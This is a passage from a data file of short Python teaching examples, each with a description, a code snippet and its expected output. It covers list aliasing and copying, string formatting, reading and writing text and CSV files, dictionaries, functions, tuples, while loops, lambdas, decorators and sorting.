 code:{py:`a = [1, 2, 3]
b = a                 # b refers to the SAME object
print(a is b)         # True
c = [1, 2, 3]
print(a == c)         # True  (same contents)
print(a is c)         # False (different objects)`}},
{id:"py-mut-aliasing", cat:"Python Examples", title:"Mutation · Aliasing",
 level:"beginner", example_output:"[1, 2, 3, 4]",
 desc:"When two names refer to the same mutable object they're aliases — a change made through one is visible through the other, because there's really only one list. Here appending via b also shows up in a. Aliasing is a frequent source of 'why did that change?' bugs, especially when a list is passed into a function that modifies it.",
 code:{py:`a = [1, 2, 3]
b = a                # alias: two names, one list
b.append(4)
print(a)             # [1, 2, 3, 4]  <- change shows through 'a' too`}},
{id:"py-mut-clone", cat:"Python Examples", title:"Mutation · Cloning lists",
 level:"beginner", example_output:"[1, 2, 3]\n[1, 2, 3, 4]",
 desc:"To avoid aliasing, make a copy so the two lists are independent. a[:] (a full slice), list(a), and a.copy() all produce a new list with the same items; mutating the copy leaves the original untouched. Note this is a shallow copy — nested lists inside are still shared; for those use copy.deepcopy().",
 code:{py:`a = [1, 2, 3]
b = a[:]             # slice makes a copy
b.append(4)
print(a)             # [1, 2, 3]      unchanged
print(b)             # [1, 2, 3, 4]
# also: b = list(a)  or  b = a.copy()`}},
{id:"py-mut-listmethods", cat:"Python Examples", title:"Mutation · Mutating list methods",
 level:"beginner", example_output:"[0, 2, 3] popped: 4",
 desc:"These list methods change the list in place and (mostly) return None, not a new list: append adds to the end, insert(i, x) puts x at index i, remove(x) deletes the first x, pop() removes and returns the last item, and sort() orders the list. Because they mutate, don't write lst = lst.sort() — that stores None; just call lst.sort().",
 code:{py:`lst = [3, 1, 2]
lst.append(4)        # add to end
lst.insert(0, 0)     # insert at index
lst.remove(1)        # remove first matching value
popped = lst.pop()   # remove & return last
lst.sort()           # sort in place
print(lst, "popped:", popped)`}},
{id:"py-mut-append-vs-concat", cat:"Python Examples", title:"Mutation · Append vs. concatenate",
 level:"beginner", example_output:"[1, 2, 3]\n[1, 2, 3]",
 desc:"append and + look similar but differ in a way that matters. a.append(3) mutates the existing list in place and returns None. b = b + [3] builds a brand-new list and rebinds b to it, leaving the old one untouched. Inside loops, repeated + is also slower because it copies each time; prefer append for growing a list.",
 code:{py:`a = [1, 2]
a.append(3)          # mutates a in place -> [1, 2, 3]
print(a)
b = [1, 2]
b = b + [3]          # builds a NEW list, rebinds b
print(b)             # [1, 2, 3]`}},
{id:"py-mut-strmethods", cat:"Python Examples", title:"Mutation · Non-mutating string methods",
 level:"beginner", example_output:"HELLO, WORLD\nhello, world\nHeLLo, WorLd\nHello, World\nHello, World",
 desc:"Because strings are immutable, their methods never change the original — they return a new string. s.upper(), s.lower(), s.replace(old, new), and s.strip() all hand back a fresh value while s stays 'Hello, World'. So you must capture the result (s = s.upper()); calling s.upper() and ignoring it does nothing.",
 code:{py:`s = "Hello, World"
print(s.upper())     # 'HELLO, WORLD'  (returns new string)
print(s.lower())
print(s.replace("l", "L"))
print(s.strip())
print(s)             # original unchanged: 'Hello, World'`}},
{id:"py-mut-format", cat:"Python Examples", title:"Mutation · String .format() method",
 level:"beginner", example_output:"Sam scored 95\n2 + 2 = 4\nAna is 30\n3.14",
 desc:"str.format() fills {} placeholders in a template with the arguments you pass. Empty braces fill in order; numbered braces ({0}) reference or repeat arguments; named braces ({n}) match keyword arguments; and a format spec after a colon controls presentation ({:.2f} for two decimals). f-strings are usually shorter, but format() shines when the template is built separately from the data.",
 code:{py:`name, score = "Sam", 95
print("{} scored {}".format(name, score))
print("{0} + {0} = {1}".format(2, 4))       # positional
print("{n} is {a}".format(n="Ana", a=30))   # named
print("{:.2f}".format(3.14159))             # '3.14'`}},
{id:"py-mut-fstrings", cat:"Python Examples", title:"Mutation · f-strings",
 level:"beginner", example_output:"Sam scored 95\n2 + 2 = 4\n3.14\n'Sam'",
 desc:"An f-string (prefix f) drops expressions straight into a string inside {} — variables, arithmetic, function calls — evaluated on the spot. Add a format spec after a colon (:.2f) just like format(), or !r to show the repr (quoted) form. They're the most readable way to build strings in modern Python; just remember the leading f, or the braces stay literal.",
 code:{py:`name, score = "Sam", 95
print(f"{name} scored {score}")
print(f"{2} + {2} = {2 + 2}")     # expressions inside
pi = 3.14159
print(f"{pi:.2f}")                # '3.14'
print(f"{name!r}")               # 'Sam' with quotes (repr)`}},
{id:"py-mut-accum-list", cat:"Python Examples", title:"Mutation · Accumulator pattern with lists",
 level:"beginner", example_output:"[1, 4, 9, 16, 25]",
 desc:"To build a list with a loop, start from an empty list and append each computed item as you go. This 'grow a collection' form of the accumulator pattern is everywhere — collecting, filtering, transforming results. (Once it's comfortable, a list comprehension — [n*n for n in range(1, 6)] — says the same thing in one line.)",
 code:{py:`squares = []                 # start empty
for n in range(1, 6):
    squares.append(n * n)    # accumulate items
print(squares)               # [1, 4, 9, 16, 25]`}},
{id:"py-mut-accum-str", cat:"Python Examples", title:"Mutation · Accumulator pattern with strings",
 level:"beginner", example_output:"PNG",
 desc:"The same accumulator idea builds a string: start with '' and concatenate a piece each pass — here the first letter of each word to form an acronym. It reads clearly for small cases. For long loops, appending to a list and ''.join()-ing at the end is faster, since each + on a string makes a new copy.",
 code:{py:`acronym = ""                       # start empty
for word in ["Portable", "Network", "Graphics"]:
    acronym = acronym + word[0]    # build up
print(acronym)                     # 'PNG'`}},

{id:"py-file-read", cat:"Python Examples", title:"Files · Reading a file",
 level:"beginner", example_output:"(with a notes.txt that contains two lines)\nBuy milk\nCall the vet",
 desc:"open() connects your program to a file; the 'r' mode means read-only, and read() slurps the entire contents into one string. Always pair open() with 'with' so the file is closed for you. The file must already exist or you get FileNotFoundError. read() is fine for small files, but for large ones prefer looping line by line so you don't load everything into memory.",
 code:{py:`with open("notes.txt", "r") as f:
    contents = f.read()
print(contents)`}},
{id:"py-file-read-alt", cat:"Python Examples", title:"Files · Alternative file-reading methods",
 level:"beginner", example_output:"(reading a 2-line notes.txt)\nBuy milk\n2 lines",
 desc:"Besides read(), two methods give finer control. readline() returns just the next line (including its trailing newline, which is why you often rstrip() it), advancing a hidden cursor each call. readlines() returns a list of all lines at once — convenient, but it loads the whole file. Reopen or seek(0) to read again, since the cursor doesn't rewind on its own.",
 code:{py:`with open("notes.txt", "r") as f:
    line = f.readline()      # one line (keeps trailing newline)
    print(line.rstrip())
with open("notes.txt", "r") as f:
    lines = f.readlines()    # list of all lines
    print(len(lines), "lines")`}},
{id:"py-file-iter", cat:"Python Examples", title:"Files · Iterating over lines in a file",
 level:"beginner", example_output:"(printing each line of notes.txt)\nBuy milk\nCall the vet",
 desc:"The most Pythonic way to process a text file is to loop over the file object directly — for line in f — which hands you one line at a time and, crucially, doesn't load the whole file into memory. That makes it safe even for huge logs. Each line keeps its trailing newline, so rstrip() it before printing to avoid blank gaps.",
 code:{py:`with open("notes.txt", "r") as f:
    for line in f:                 # line by line
        print(line.rstrip())       # rstrip drops the newline`}},
{id:"py-file-with", cat:"Python Examples", title:"Files · Using with (context manager)",
 level:"beginner", example_output:"closed? True",
 desc:"The with statement (a context manager) guarantees the file is closed when the block ends — even if an exception is raised inside it — so you never leak an open handle or lose buffered writes. Afterwards f.closed is True. Always prefer 'with open(...) as f:' over a bare open(); it's the difference between reliable cleanup and hoping you remembered to call f.close().",
 code:{py:`with open("notes.txt", "r") as f:
    data = f.read()
# f is closed automatically here
print("closed?", f.closed)         # True`}},
{id:"py-file-write", cat:"Python Examples", title:"Files · Writing text files",
 level:"beginner", example_output:"wrote out.txt",
 desc:"To create or change a file, open it in a writing mode: 'w' truncates an existing file (or creates a new one) and starts fresh, while 'a' appends to the end without erasing. write() writes exactly the string you give it — it does not add line breaks, so include a newline (\\n) yourself. Opening in 'w' is destructive, so be sure before you overwrite.",
 danger:"Creates/overwrites out.txt in the working directory.",
 code:{py:`with open("out.txt", "w") as f:
    f.write("line one\\n")
    f.write("line two\\n")
print("wrote out.txt")`}},
{id:"py-file-csv-format", cat:"Python Examples", title:"Files · CSV format",
 level:"beginner", example_output:"['name', 'age', 'city']\n['Sam', '42', 'Denver']\n['Ana', '30', 'Reno']",
 desc:"CSV (comma-separated values) is the plain-text spreadsheet format: one record per line, fields separated by commas, usually with a header row of column names. You can parse simple CSV by hand — split on newlines, then split each line on commas — which is a good way to see its shape. Real CSV has quoting and edge cases, so the csv module is safer for anything beyond toy data.",
 code:{py:`sample = "name,age,city\\nSam,42,Denver\\nAna,30,Reno"
for line in sample.split("\\n"):
    fields = line.split(",")
    print(fields)`}},
{id:"py-file-csv-read", cat:"Python Examples", title:"Files · Reading data from a CSV",
 level:"intermediate", example_output:"columns: ['name', 'age']\n['Sam', '42']\n['Ana', '30']",
 desc:"The csv module reads CSV correctly, handling quoted fields and embedded commas that a naive split() would mangle. csv.reader(f) yields each row as a list of strings; next(reader) grabs the header row, then the loop walks the data rows. Open the file with newline='' (as the csv docs advise) so line endings are handled properly across platforms.",
 code:{py:`import csv
with open("people.csv", newline="") as f:
    reader = csv.reader(f)
    header = next(reader)          # first row = column names
    print("columns:", header)
    for row in reader:
        print(row)                 # each row is a list of strings`}},
{id:"py-file-csv-write", cat:"Python Examples", title:"Files · Writing data to a CSV",
 level:"intermediate", example_output:"wrote people.csv",
 desc:"csv.writer serializes rows to CSV properly — quoting any field that contains a comma or quote so the file stays valid. writerow(row) writes one row; writerows(rows) writes many at once. As with reading, open the file with newline='' to avoid stray blank lines on Windows. Numbers are converted to their text form automatically.",
 danger:"Creates/overwrites people.csv in the working directory.",
 code:{py:`import csv
rows = [["name", "age"], ["Sam", 42], ["Ana", 30]]
with open("people.csv", "w", newline="") as f:
    writer = csv.writer(f)
    writer.writerows(rows)         # write all rows at once
print("wrote people.csv")`}},

{id:"py-dict-intro", cat:"Python Examples", title:"Dictionaries · Dictionaries",
 level:"beginner", example_output:"42\n{'Sam': 42, 'Ana': 30, 'Kim': 25}",
 desc:"A dictionary maps keys to values — think of it as a lookup table where you fetch a value by its key rather than a numeric position. You index with the key (ages['Sam']), and assigning to a new key adds a pair. Keys must be unique and immutable (strings, numbers, tuples); values can be anything. Since Python 3.7 dicts keep insertion order.",
 code:{py:`ages = {"Sam": 42, "Ana": 30}
print(ages["Sam"])        # 42
ages["Kim"] = 25          # add a pair
print(ages)`}},
{id:"py-dict-ops", cat:"Python Examples", title:"Dictionaries · Dictionary operations",
 level:"beginner", example_output:"True\n2",
 desc:"The core dictionary operations: assign to a key to add or update it (an existing key is overwritten), del d[key] removes a pair (KeyError if it's missing), the in operator tests whether a key is present, and len() counts the pairs. Lookup and membership are fast — dicts are built on hashing, so they don't slow down as they grow.",
 code:{py:`d = {"a": 1, "b": 2}
d["c"] = 3            # add / update
del d["a"]           # delete a key
print("b" in d)      # True  (membership tests keys)
print(len(d))        # 2`}},
{id:"py-dict-methods", cat:"Python Examples", title:"Dictionaries · Dictionary methods",
 level:"beginner", example_output:"['a', 'b']\n[1, 2]\n[('a', 1), ('b', 2)]\n0",
 desc:"These methods expose a dict's contents: keys() gives the keys, values() the values, and items() the (key, value) pairs — each as a live 'view' you can loop over or wrap in list(). get(key, default) looks a key up but returns the default instead of raising when it's missing. items() is the one you'll reach for most, to loop over keys and values together.",
 code:{py:`d = {"a": 1, "b": 2}
print(list(d.keys()))     # ['a', 'b']
print(list(d.values()))   # [1, 2]
print(list(d.items()))    # [('a', 1), ('b', 2)]
print(d.get("z", 0))      # 0 default`}},
{id:"py-dict-iter", cat:"Python Examples", title:"Dictionaries · Iterating over dictionaries",
 level:"beginner", example_output:"Sam 95\nAna 88\nSam: 95\nAna: 88",
 desc:"Looping over a dict directly gives you its keys (for name in scores), which you can use to fetch each value. More often you want both at once — for that, iterate scores.items(), which unpacks into key and value each pass. Iteration follows insertion order, so the output is predictable.",
 code:{py:`scores = {"Sam": 95, "Ana": 88}
for name in scores:                 # iterates keys
    print(name, scores[name])
for name, score in scores.items():  # key and value
    print(f"{name}: {score}")`}},
{id:"py-dict-get", cat:"Python Examples", title:"Dictionaries · Safely retrieving values (.get)",
 level:"beginner", example_output:"1\nNone\n0",
 desc:"Indexing a missing key (d['z']) raises KeyError and stops the program. get() is the safe alternative: d.get('z') returns None when the key is absent, and d.get('z', 0) lets you supply your own default. This is invaluable when a key may or may not be there — and it's the trick behind counting with get(word, 0) + 1.",
 code:{py:`d = {"a": 1}
print(d.get("a"))        # 1
print(d.get("z"))        # None (no KeyError)
print(d.get("z", 0))     # 0   supply a default`}},
{id:"py-dict-alias-copy", cat:"Python Examples", title:"Dictionaries · Aliasing and copying",
 level:"beginner", example_output:"{'x': 1, 'y': 2}\n{'x': 1, 'y': 2}",
 desc:"Dictionaries are mutable, so the same aliasing rules as lists apply: b = a makes b another name for the same dict, and changes through one show in the other. To get an independent dict, use a.copy() (or dict(a)); mutating the copy leaves the original alone. Like lists, copy() is shallow — nested mutable values are still shared.",
 code:{py:`a = {"x": 1}
b = a                 # alias: same dict
b["y"] = 2
print(a)              # {'x': 1, 'y': 2}  changed too
c = a.copy()          # independent copy
c["z"] = 9
print(a)              # unchanged by c`}},
{id:"py-dict-accum", cat:"Python Examples", title:"Dictionaries · Accumulating results in a dictionary",
 level:"beginner", example_output:"{'to': 2, 'be': 2, 'or': 1, 'not': 1}",
 desc:"A dictionary is the natural home for tallies. Start with an empty dict, then for each item do counts[key] = counts.get(key, 0) + 1 — get() supplies 0 the first time a key is seen, so you never hit a KeyError. This word-frequency count is a classic; the same shape works for grouping and histograms. (collections.Counter does it in one line.)",
 code:{py:`text = "to be or not to be"
counts = {}
for word in text.split():
    counts[word] = counts.get(word, 0) + 1   # tally
print(counts)     # {'to': 2, 'be': 2, 'or': 1, 'not': 1}`}},
{id:"py-dict-best-key", cat:"Python Examples", title:"Dictionaries · Accumulating the best key",
 level:"beginner", example_output:"most common: to",
 desc:"To find the key with the largest value, walk the dict tracking the best key so far and update only when you meet a strictly larger value. Starting best at None handles the first/empty case. Ties go to whichever key was seen first (insertion order). In practice max(counts, key=counts.get) does the same in one line, but the loop shows the logic.",
 code:{py:`counts = {"to": 2, "be": 2, "or": 1, "not": 1}
best = None
for word in counts:
    if best is None or counts[word] > counts[best]:
        best = word            # track key with the largest value
print("most common:", best)`}},

{id:"py-fn-def", cat:"Python Examples", title:"Functions · Function definition",
 level:"beginner", example_output:"Hello!\nWelcome.",
 desc:"def creates a function — it names a block of code but doesn't run it; the body executes only when you call the function later with greet(). This lets you define reusable behaviour once and invoke it wherever needed. The indented lines under def are the function body; the first line back at the outer indentation ends it.",
 code:{py:`def greet():
    print("Hello!")
    print("Welcome.")
# defining does not run it
greet()          # now it runs`}},
{id:"py-fn-invoke", cat:"Python Examples", title:"Functions · Function invocation",
 level:"beginner", example_output:"25\n81",
 desc:"You run a function by writing its name followed by parentheses, passing any arguments inside. A call evaluates to the function's return value, so calls can nest — square(square(3)) computes the inner call first (9), then the outer (81). Forgetting the parentheses gives you the function object itself, not the result of calling it.",
 code:{py:`def square(x):
    return x * x
print(square(5))            # 25
print(square(square(3)))   # square(9) -> 81`}},
{id:"py-fn-params", cat:"Python Examples", title:"Functions · Parameters",
 level:"beginner", example_output:"1024\n8",
 desc:"Parameters are the named slots in a definition; arguments are the values you supply at the call. Positional arguments fill parameters left to right (power(2, 10)), while keyword arguments name the slot explicitly (power(exp=3, base=2)) and so can come in any order. Keywords make calls self-documenting and let you skip past parameters that have defaults.",
 code:{py:`def power(base, exp):        # two parameters
    return base ** exp
print(power(2, 10))          # 1024  (positional args)
print(power(exp=3, base=2))  # 8     (keyword args)`}},
{id:"py-fn-return", cat:"Python Examples", title:"Functions · Returning a value",
 level:"beginner", example_output:"7",
 desc:"return hands a value back to whoever called the function and immediately ends the function. That value can be stored, printed, or fed into another expression — it's how a function produces a result rather than merely performing an action. A function with no return (or a bare return) hands back None.",
 code:{py:`def add(a, b):
    return a + b       # hands a value back
total = add(3, 4)
print(total)           # 7`}},
{id:"py-fn-annotations", cat:"Python Examples", title:"Functions · Type annotations",
 level:"intermediate", example_output:"ababab",
 desc:"Type annotations document what types a function expects and returns — text: str, times: int, -> str. They're purely informational: Python does not check or enforce them at runtime, so passing the wrong type still runs (and may fail elsewhere). Their value is readability plus tooling — editors and type checkers like mypy use them to catch mistakes before you run.",
 code:{py:`def repeat(text: str, times: int) -> str:
    return text * times
print(repeat("ab", 3))     # 'ababab'`}},
{id:"py-fn-accum", cat:"Python Examples", title:"Functions · A function that accumulates",
 level:"beginner", example_output:"10",
 desc:"Wrapping the accumulator pattern in a function makes it reusable: total() initializes acc, adds each number, and returns the sum — so any caller can reuse it without repeating the loop. This is the essence of a function: name a computation once, then call it with different inputs. (The built-in sum() already does exactly this.)",
 code:{py:`def total(nums):
    acc = 0
    for n in nums:
        acc += n
    return acc
print(total([1, 2, 3, 4]))   # 10`}},
{id:"py-fn-local", cat:"Python Examples", title:"Functions · Local scope",
 level:"beginner", example_output:"10",
 desc:"Names created inside a function — its parameters and any variables it assigns — are local: they exist only while the function runs and vanish when it returns. That's why print(x) outside f raises NameError; x lived only inside f. Local scope is a feature — functions can use handy names like x or i without clobbering anything outside.",
 code:{py:`def f():
    x = 10        # local to f
    print(x)
f()
# print(x)        # NameError: x doesn't exist out here`}},
{id:"py-fn-global", cat:"Python Examples", title:"Functions · Global variables",
 level:"intermediate", example_output:"2",
 desc:"By default, assigning to a name inside a function creates a new local — it won't touch a module-level variable of the same name. The global keyword overrides that, telling the function to rebind the outer name instead (so bump() really increments the shared count). Use it sparingly: functions that quietly change globals are hard to reason about; returning a value is usually cleaner.",
 code:{py:`count = 0
def bump():
    global count      # rebind the module-level name
    count += 1
bump(); bump()
print(count)          # 2`}},
{id:"py-fn-composition", cat:"Python Examples", title:"Functions · Composition",
 level:"beginner", example_output:"10",
 desc:"Composition means feeding one function's output straight into another — double(inc(4)) runs inc first (5), then double (10). Building programs from small functions that each do one thing, then chaining them, keeps code readable and testable. It's the same idea as piping commands together, just with parentheses nesting inside-out.",
 code:{py:`def double(x): return x * 2
def inc(x):    return x + 1
print(double(inc(4)))     # double(5) -> 10`}},
{id:"py-fn-print-vs-return", cat:"Python Examples", title:"Functions · Print vs. return",
 level:"beginner", example_output:"5\ngot: None\ngot: 5",
 desc:"print and return are easy to confuse but do different jobs. print shows a value on screen for a human and itself evaluates to None. return hands a value back to the program so it can be used further. A function that only prints returns None — so x = add_p(2, 3) stores None, a classic surprise. If the caller needs the value, the function must return it.",
 code:{py:`def add_p(a, b): print(a + b)    # shows it, returns None
def add_r(a, b): return a + b    # hands value back
x = add_p(2, 3)     # prints 5
print("got:", x)    # got: None
y = add_r(2, 3)
print("got:", y)    # got: 5`}},
{id:"py-fn-mutable-args", cat:"Python Examples", title:"Functions · Passing mutable objects",
 level:"intermediate", example_output:"['a', 'new']",
 desc:"Arguments are passed by object reference, so passing a mutable object (a list, dict) hands the function the same object — not a copy. Calling lst.append inside add_item therefore changes the caller's list. Powerful, but easy to overlook: if a function shouldn't modify its input, have it work on a copy (lst[:]) or return a new value instead.",
 code:{py:`def add_item(lst):
    lst.append("new")     # mutates the caller's list
items = ["a"]
add_item(items)
print(items)              # ['a', 'new']`}},
{id:"py-fn-side-effects", cat:"Python Examples", title:"Functions · Side effects",
 level:"intermediate", example_output:"start\n['start']",
 desc:"A side effect is anything a function does beyond returning a value — printing, mutating an outer list, writing a file, changing global state. Side effects are how programs actually do things, but they make functions harder to test and reuse. A good habit: prefer 'pure' functions (values in, value out) where you can, and keep the side-effecting parts few and obvious.",
 code:{py:`log = []
def record(msg):
    log.append(msg)       # side effect: mutates outer list
    print(msg)            # side effect: output
record("start")
print(log)                # ['start']`}},

{id:"py-tup-packing", cat:"Python Examples", title:"Tuples · Tuple packing",
 level:"beginner", example_output:"(3, 4)\n<class 'tuple'>",
 desc:"A tuple is an immutable, ordered group of values. Writing comma-separated values packs them into a tuple — the parentheses are usually optional, so point = 3, 4 makes (3, 4); the comma is what matters. Tuples suit fixed records whose contents shouldn't change (a coordinate, an RGB colour), and because they're immutable they can even serve as dictionary keys.",
 code:{py:`point = 3, 4          # -> (3, 4)
print(point)
print(type(point))    # <class 'tuple'>`}},
{id:"py-tup-unpack", cat:"Python Examples", title:"Tuples · Tuple assignment with unpacking",
 level:"beginner", example_output:"3 4",
 desc:"Unpacking spreads a tuple's items across several names in one assignment: x, y = point binds x to the first item and y to the second. The number of names must match the number of items, or you get a ValueError. It's a clean way to name the parts of a returned pair or a record without indexing.",
 code:{py:`point = (3, 4)
x, y = point          # unpack into two names
print(x, y)           # 3 4`}},
{id:"py-tup-swap", cat:"Python Examples", title:"Tuples · Swapping values",
 level:"beginner", example_output:"2 1",
 desc:"Because the right-hand side is evaluated first (into a tuple) before anything is assigned, a, b = b, a swaps two variables in a single line — no temporary needed. It reads exactly as 'let a and b become b and a'. This is the idiomatic Python swap, and it generalises to rotating three or more values at once.",
 code:{py:`a, b = 1, 2
a, b = b, a           # swap
print(a, b)           # 2 1`}},
{id:"py-tup-iter-unpack", cat:"Python Examples", title:"Tuples · Unpacking into iterator variables",
 level:"beginner", example_output:"1 a\n2 b\n3 c",
 desc:"When you loop over a list of tuples, you can unpack each one right in the for-target: for num, letter in pairs gives you both parts by name every pass, instead of indexing pair[0] and pair[1]. It makes loops over paired or record-like data read almost like English — and it's exactly how looping over dict.items() works.",
 code:{py:`pairs = [(1, "a"), (2, "b"), (3, "c")]
for num, letter in pairs:      # unpack each tuple
    print(num, letter)`}},
{id:"py-tup-enumerate", cat:"Python Examples", title:"Tuples · enumerate",
 level:"beginner", example_output:"0 a\n1 b\n2 c\n1 x\n2 y",
 desc:"enumerate() wraps an iterable so each pass yields an (index, value) pair, which you unpack into two names — the tidy alternative to managing a counter or looping over range(len(...)). Pass start= to begin numbering somewhere other than 0 (handy for human-facing 1-based lists). It's the standard answer to 'I need the position and the item.'",
 code:{py:`for i, item in enumerate(["a", "b", "c"]):
    print(i, item)             # 0 a / 1 b / 2 c
for i, item in enumerate(["x", "y"], start=1):
    print(i, item)             # 1 x / 2 y`}},
{id:"py-tup-return", cat:"Python Examples", title:"Tuples · Tuples as return values",
 level:"beginner", example_output:"1 8",
 desc:"A function returns a single object — but that object can be a tuple, which is how Python functions effectively return several values at once (return min(nums), max(nums)). The caller unpacks them into separate names: lo, hi = min_max(...). It's cleaner than returning a list or a dict when there's a small, fixed set of outputs.",
 code:{py:`def min_max(nums):
    return min(nums), max(nums)   # returns a tuple
lo, hi = min_max([4, 1, 8, 3])
print(lo, hi)                     # 1 8`}},
{id:"py-tup-arg-unpack", cat:"Python Examples", title:"Tuples · Unpacking tuples as function arguments",
 level:"intermediate", example_output:"6",
 desc:"The * operator in a call unpacks a sequence into separate positional arguments, so add(*args) with args = (1, 2, 3) is exactly add(1, 2, 3). It's the mirror image of *args in a definition (which packs arguments into a tuple). Use it to forward a collected set of arguments, or to pass a list/tuple's elements to a function that expects them individually. (** does the same for dicts into keyword arguments.)",
 code:{py:`def add(a, b, c):
    return a + b + c
args = (1, 2, 3)
print(add(*args))       # -> add(1, 2, 3) -> 6`}},

{id:"py-while", cat:"Python Examples", title:"While loops · The while statement",
 level:"beginner", example_output:"5\n4\n3\n2\n1\nliftoff",
 desc:"A while loop repeats its block as long as a condition stays True, re-checking that condition before each pass. Unlike a for loop, you manage the progress yourself — here n -= 1 moves toward the exit. The cardinal rule: something in the body must eventually make the condition False, or you get an infinite loop. Use while when you don't know in advance how many times to repeat.",
 code:{py:`n = 5
while n > 0:
    print(n)
    n -= 1              # must progress toward stopping
print("liftoff")`}},
{id:"py-while-listener", cat:"Python Examples", title:"While loops · The listener loop",
 level:"beginner", example_output:"command (quit to exit): hello\nyou said: hello\ncommand (quit to exit): quit",
 desc:"A listener loop runs 'forever' (while True) and reads input each pass, breaking out when a stop condition is met — here typing 'quit'. It's the shape of interactive tools and menus: keep prompting until the user chooses to leave. The break is what makes while True safe; without an exit path it would never end.",
 code:{py:`while True:
    cmd = input("command (quit to exit): ")
    if cmd == "quit":
        break
    print("you said:", cmd)`}},
{id:"py-while-sentinel", cat:"Python Examples", title:"While loops · Sentinel values",
 level:"beginner", example_output:"number (blank to finish): 10\nnumber (blank to finish): 5\nnumber (blank to finish): \ntotal: 15",
 desc:"A sentinel is a special input value that means 'stop' — here an empty line ends the loop. The loop reads values and accumulates them until the sentinel appears, then reports the result. Choose a sentinel that can't be real data (blank input, or a marker like -1) so you never mistake genuine data for the stop signal.",
 code:{py:`total = 0
while True:
    entry = input("number (blank to finish): ")
    if entry == "":            # sentinel
        break
    total += int(entry)
print("total:", total)`}},
{id:"py-while-validation", cat:"Python Examples", title:"While loops · Input validation",
 level:"beginner", example_output:"Age (0-120): abc\ntry again\nAge (0-120): 200\ntry again\nAge (0-120): 42\nok: 42",
 desc:"To insist on good input, loop until it passes a check and only then break. Here isdigit() confirms the text is all digits before int() is trusted, and the range test rejects out-of-bounds numbers — bad entries just re-prompt. This 'loop-and-a-half' (test in the middle, break on success) is the standard way to validate user input robustly.",
 code:{py:`while True:
    age = input("Age (0-120): ")
    if age.isdigit() and 0 <= int(age) <= 120:
        break
    print("try again")
print("ok:", age)`}},
{id:"py-while-break-continue", cat:"Python Examples", title:"While loops · break and continue",
 level:"beginner", example_output:"1\n2\n4\n5",
 desc:"break and continue give a loop two escape hatches. continue skips the rest of the current pass and jumps to the next iteration (here it drops 3). break leaves the loop entirely (here it stops at 6, so 6 onward never print). They work in both for and while loops; use them to handle special cases without piling up nested if/else.",
 code:{py:`for n in range(1, 10):
    if n == 3:
        continue        # skip the rest of THIS pass
    if n == 6:
        break           # exit the loop entirely
    print(n)            # 1, 2, 4, 5`}},

{id:"py-adv-optional", cat:"Python Examples", title:"Adv. functions · Optional parameters",
 level:"intermediate", example_output:"Hello Sam\nHi Ana",
 desc:"A default value makes a parameter optional: def greet(name, greeting='Hello') lets callers omit greeting and get the default, or pass their own to override it. Defaults must come after the non-default parameters. One trap worth knowing: never use a mutable default like [] or {} — it's created once and shared across calls; use None and build inside instead.",
 code:{py:`def greet(name, greeting="Hello"):
    print(greeting, name)
greet("Sam")                 # Hello Sam
greet("Ana", "Hi")           # Hi Ana`}},
{id:"py-adv-keyword", cat:"Python Examples", title:"Adv. functions · Keyword parameters",
 level:"intermediate", example_output:"5x2 filled with .\n3x3 filled with #",
 desc:"Passing arguments by name (width=5, height=2) lets you supply them in any order and makes the call self-documenting — you can see which value means what. You can mix positional and keyword arguments, but every positional one must come before the keywords. This pairs naturally with default parameters, letting callers set just the options they care about.",
 code:{py:`def box(width, height, fill="."):
    print(f"{width}x{height} filled with {fill}")
box(height=2, width=5)          # order-independent
box(3, 3, fill="#")`}},
{id:"py-adv-lambda", cat:"Python Examples", title:"Adv. functions · Anonymous functions (lambda)",
 level:"intermediate", example_output:"36\n[(3, 2), (1, 5), (2, 8)]",
 desc:"lambda builds a small, unnamed function in a single expression — lambda x: x * x is just a compact def with an implicit return. Its main use is as a throwaway 'key' passed to functions like sorted(), max(), and min() to say what to compare by (here, each point's second item). For anything longer than one expression, a named def reads better.",
 code:{py:`square = lambda x: x * x       # tiny inline function
print(square(6))               # 36
pts = [(1, 5), (3, 2), (2, 8)]
print(sorted(pts, key=lambda p: p[1]))   # sort by 2nd item`}},
{id:"py-adv-methods", cat:"Python Examples", title:"Adv. functions · Method invocations",
 level:"intermediate", example_output:"HELLO\n[1, 2, 3]",
 desc:"A method is a function that belongs to an object and is called with dot syntax: s.upper() runs the str type's upper on the string s, which is passed in automatically as the thing to act on. Some methods return a new value (str methods, since strings are immutable) while others mutate the object in place and return None (list.sort()) — know which is which.",
 code:{py:`s = "hello"
print(s.upper())        # 'HELLO'
nums = [3, 1, 2]
nums.sort()             # method mutates the list
print(nums)`}},
{id:"py-adv-decorator", cat:"Python Examples", title:"Adv. functions · Function wrapping and decorators",
 level:"advanced", example_output:"HI SAM",
 desc:"A decorator is a function that takes a function and returns a new one wrapping it — adding behaviour before or after, or transforming the result (here shout upper-cases whatever greet returns). The @shout line above def greet is just sugar for greet = shout(greet). It's how features like caching, timing, and access checks get bolted onto functions without editing their bodies. (*args, **kwargs let the wrapper forward any arguments.)",
 code:{py:`def shout(func):                 # wraps another function
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs).upper()
    return wrapper

@shout
def greet(name):
    return f"hi {name}"
print(greet("sam"))              # 'HI SAM'`}},

{id:"py-sort-basics", cat:"Python Examples", title:"Sorting · sort and sorted",
 level:"beginner", example_output:"[1, 2, 3]\n[3, 1, 2]\n[1, 2, 3]",
 desc:"Two ways to sort. sorted(iterable) returns a brand-new sorted list and leaves the original alone — it works on any iterable. list.sort() sorts the list in place and returns None (so don't write nums = nums.sort()). Use sorted() when you need the original order preserved or you're sorting something that isn't a list; use .sort() to reorder a list you own.",
 code:{py:`nums = [3, 1, 2]
print(sorted(nums))     # [1, 2, 3]  new list
print(nums)             # [3, 1, 2]  unchanged
nums.sort()             # in place, returns None
print(nums)             # [1, 2, 3]`}},
{id:"py-sort-reverse", cat:"Python Examples", title:"Sorting · reverse parameter",
 level:"beginner", example_output:"[3, 2, 1]\n['c', 'b', 'a']",
 desc:"Both sorted() and .sort() take reverse=True to order from high to low instead of the default low to high. It applies after any key computation, so you can sort by any criterion and simply flip the direction. For a plain reversal of an already-ordered sequence, slicing seq[::-1] is an alternative that doesn't re-sort.",
 code:{py:`nums = [1, 2, 3]
print(sorted(nums, reverse=True))    # [3, 2, 1]
words = ["b", "a", "c"]
words.sort(reverse=True)
print(words)                          # ['c', 'b', 'a']`}},
{id:"py-sort-key", cat:"Python Examples", title:"Sorting · key parameter",
 level:"intermediate", example_output:"['kiwi', 'apple', 'banana']\n['apple', 'banana', 'kiwi']",
